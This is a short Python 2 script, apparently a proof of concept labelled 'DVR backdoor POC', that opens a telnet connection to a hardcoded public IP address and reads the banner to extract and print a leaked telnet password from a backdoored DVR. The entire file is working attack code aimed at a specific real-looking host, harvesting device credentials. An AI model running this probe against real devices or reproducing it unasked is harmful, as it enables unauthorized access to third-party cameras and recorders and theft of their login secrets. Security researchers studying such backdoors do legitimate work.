import socket

'''
@Author:mosin
@Date:2018-05-04
@DVR backdoor POC
'''

HOST = "122.117.153.41"

def check():
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((HOST,23))
    passwd = sock.recv(1024)
    passwd = sock.recv(1024)
    if "passwd:" in passwd:
        print "[*] YES,Vulnerability!"
        passwd = passwd.replace("(none) login:","")
        
        print "Telnet Pass: " + passwd 
    else:
        print "[-] Sorry,NO Found!"


if __name__ =='__main__':
    check()

